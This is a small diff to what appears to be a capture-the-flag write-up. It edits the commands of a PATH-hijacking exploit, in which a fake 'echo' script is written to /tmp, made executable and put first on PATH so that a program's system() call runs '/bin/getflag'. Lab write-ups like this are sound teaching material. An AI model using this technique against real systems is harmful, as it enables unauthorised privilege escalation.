@@ -43,7 +43,7 @@ so on the system function call we can override the behavior of echo to inject ou
 `echo "/bin/getflag" > /tmp/echo && chmod +x /tmp/echo && PATH=/tmp:$PATH`
 
 ```
- echo "echo getflag" >> /tmp/echo
+ echo "echo getflag" > /tmp/echo
  chmod 777 /tmp/echo
  export PATH=/tmp:$PATH
 ```
